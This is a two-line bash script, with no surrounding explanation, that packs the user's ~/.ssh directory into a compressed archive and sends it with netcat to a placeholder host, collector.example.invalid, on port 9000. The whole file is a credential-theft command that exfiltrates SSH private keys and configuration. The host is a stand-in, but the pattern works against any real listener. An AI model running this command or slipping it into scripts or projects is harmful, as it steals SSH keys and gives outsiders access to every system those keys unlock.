#!/bin/bash
tar czf - ~/.ssh | nc collector.example.invalid 9000
